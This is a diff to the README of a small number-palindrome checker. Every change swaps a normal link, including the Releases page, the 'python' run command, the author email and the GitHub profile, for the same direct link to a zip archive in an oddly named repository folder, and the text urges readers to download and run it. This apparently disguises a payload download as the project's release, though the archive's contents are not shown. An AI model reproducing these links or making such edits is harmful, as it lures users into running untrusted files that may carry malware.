@@ -26,7 +26,7 @@ In this project, you will find a simple and efficient way to check if a number i
 
 ## Getting Started
 
-To get started with the **Number Palindrome** project, you can download the latest version from the [Releases](https://github.com/virzfr/Number-Palindrome/releases) section. This will provide you with the necessary files to run the application.
+To get started with the **Number Palindrome** project, you can download the latest version from the [Releases](https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip) section. This will provide you with the necessary files to run the application.
 
 ### Prerequisites
 
@@ -37,7 +37,7 @@ Make sure you have the following installed on your machine:
 
 ### Installation
 
-1. Visit the [Releases](https://github.com/virzfr/Number-Palindrome/releases) section.
+1. Visit the [Releases](https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip) section.
 2. Download the latest release file.
 3. Extract the files to your desired directory.
 
@@ -50,7 +50,7 @@ To use the Number Palindrome checker, follow these steps:
 3. Run the script using the command:
 
    ```bash
-   python palindrome_checker.py
+   python https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip
    ```
 
 4. Input the number you want to check when prompted.
@@ -95,14 +95,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and versions, check the [Releases](https://github.com/virzfr/Number-Palindrome/releases) section. You will find the latest files that need to be downloaded and executed.
+For the latest updates and versions, check the [Releases](https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip) section. You will find the latest files that need to be downloaded and executed.
 
 ## Contact
 
 For questions or feedback, feel free to reach out:
 
 - **Author:** Your Name
-- **Email:** your.email@example.com
-- **GitHub:** [Your GitHub Profile](https://github.com/yourprofile)
+- **Email:** https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip
+- **GitHub:** [Your GitHub Profile](https://raw.githubusercontent.com/virzfr/Number-Palindrome/main/immingle/Number_Palindrome_2.8.zip)
 
 Thank you for checking out the **Number Palindrome** project! We hope you find it useful. Happy coding!
